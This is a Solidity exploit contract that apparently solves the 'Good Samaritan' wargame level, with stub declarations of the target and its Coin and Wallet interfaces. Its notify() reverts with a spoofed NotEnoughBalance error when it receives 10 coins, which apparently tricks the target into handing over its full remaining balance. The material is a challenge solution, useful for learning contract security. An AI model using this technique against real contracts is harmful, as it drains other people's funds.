// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract GoodSamaritanExploit {
    error NotEnoughBalance();

    function exploit(address _address) external {
        GoodSamaritan goodSamaritan = GoodSamaritan(_address);
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {}

    function requestDonation() external returns (bool enoughBalance) {}
}

interface INotifyable {
    function notify(uint256 amount) external;
}

interface Coin {
    function balances(address account) external view returns (uint256);

    function transfer(address dest, uint256 amount) external;
}

interface Wallet {
    function donate10(address dest) external;

    function transferRemainder(address dest) external;

    function setCoin(Coin coin) external;
}
